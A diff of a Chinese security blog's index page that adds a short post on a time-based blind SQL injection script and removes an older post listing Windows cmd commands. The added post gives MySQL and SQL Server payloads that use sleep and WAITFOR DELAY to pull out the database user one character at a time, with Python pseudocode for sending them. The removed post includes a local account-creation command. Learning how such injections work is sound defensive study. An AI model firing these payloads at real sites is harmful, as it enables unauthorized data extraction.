@@ -194,6 +194,90 @@
           
           
             
+              <a class="post-title-link" href="/2015/09/18/延时sql注入脚本/" itemprop="url">
+                延时sql注入脚本
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-09-18T16:07:54+08:00" content="2015-09-18">
+            2015-09-18
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/09/18/延时sql注入脚本/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/18/延时sql注入脚本/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><p>昨天找到个延时注入,sqlmap跑出来数据库类型,试了下sqlmap生成payload好使,就自己动手写一个脚本验证一下.<br>记录下实现过程:</p>
+<h2 id="实现逻辑">实现逻辑</h2><pre><code><span class="keyword">try</span>:
+    发送payload
+    payload = <span class="string">"aaa';sleep(10)"</span>
+    conn = httplib.<span class="type">HTTPConnection</span>(host,timeout = <span class="number">5</span>);
+    conn.request(<span class="keyword">method</span>=<span class="string">"POST"</span>,url=<span class="string">"目标"</span>,body=payload,headers=headers);
+    conn.getresponse()
+    conn.close()
+expect:
+    如果发现异常说明当前payload判断正确
+</code></pre><h2 id="MYSQL相关函数">MYSQL相关函数</h2><p>在mysql中注入payload可能是这样的</p>
+<pre><code>aaa,;<span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>,sleep<span class="params">(<span class="number">8</span>)</span>,<span class="number">0</span>)</span>)</span>=<span class="number">97</span>
+</code></pre><p>说明:<br>1.当前用户(user)小写(lower)第一个字母(mid)的ascii码(ascii)等于97时延时(sleep)8秒.<br>2.mid(p1,p2,p3) p1为字符串,p2为起始位置,p3长度<br>3.在python中可以使用ord(“s”)来对应小写字母s的ascii码</p>
+<h2 id="SQLSERVER相关函数">SQLSERVER相关函数</h2><p>在sqlserver中payload可能是这样的</p>
+<pre><code>username=aa';if(ascii(substring(system_user,%d,1))=%d) <span class="operator"><span class="keyword">begin</span> WAITFOR DELAY <span class="string">'0:0:10'</span> <span class="keyword">end</span><span class="comment">--" % (i,ord(s))</span></span>
+</code></pre><p>说明:<br>1.当前用户(system_user)第i个字母(substring)的ascii码(ascii)等于小写字母s对应的ascii码(ord)时,延时(WAITFOR DELAY)10秒.<br>2.substring(p1,p2,p3) p1为字符串,p2为起始位置,p3长度,和mysql中的mid函数功能类似<br>3.ord是python内建函数,其他的函数是在目标数据库中执行的.</p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/09/16/浏览器解析算法/" itemprop="url">
                 浏览器解析算法
               </a>
@@ -1238,90 +1322,6 @@ php+apache : id = <span class="number">3</span>
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/19/cmd命令使用记录/" itemprop="url">
-                cmd命令使用记录
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-19T15:33:48+08:00" content="2015-08-19">
-            2015-08-19
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/19/cmd命令使用记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/19/cmd命令使用记录/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="查看当前活动代码页（默认编码格式）">查看当前活动代码页（默认编码格式）</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">chcp</span>
-//活动代码页为：<span class="number">936</span>，它对于的编码格式为GBK
-</code></pre><h2 id="设置当前cmd窗口标题">设置当前cmd窗口标题</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">title</span> Hello Mr.Q
-</code></pre><h2 id="添加删除程序">添加删除程序</h2><pre><code><span class="tag">cmd</span>&gt; <span class="tag">appwiz</span><span class="class">.cpl</span>
-</code></pre><h2 id="启动计算器">启动计算器</h2><pre><code><span class="built_ins">cmd</span>&gt; calc
-</code></pre><h2 id="事件查看器">事件查看器</h2><pre><code><span class="built_ins">cmd</span>&gt; eventvwr
-</code></pre><h2 id="查看系统配置">查看系统配置</h2><pre><code><span class="built_ins">cmd</span>&gt; msinfo32
-</code></pre><h2 id="注册表编辑器">注册表编辑器</h2><pre><code><span class="built_ins">cmd</span>&gt; regedit
-</code></pre><h2 id="用户操作">用户操作</h2><pre><code><span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span>
-//查看现有账户
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin
-//查看admin账户详情
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin    password /<span class="built_ins">add</span>
-//添加用户
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin /del
-//删除
-</code></pre></span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1360,7 +1360,7 @@ php+apache : id = <span class="number">3</span>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">38</span>
+              <span class="site-state-item-count">39</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1374,7 +1374,7 @@ php+apache : id = <span class="number">3</span>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">35</span>
+              <span class="site-state-item-count">37</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
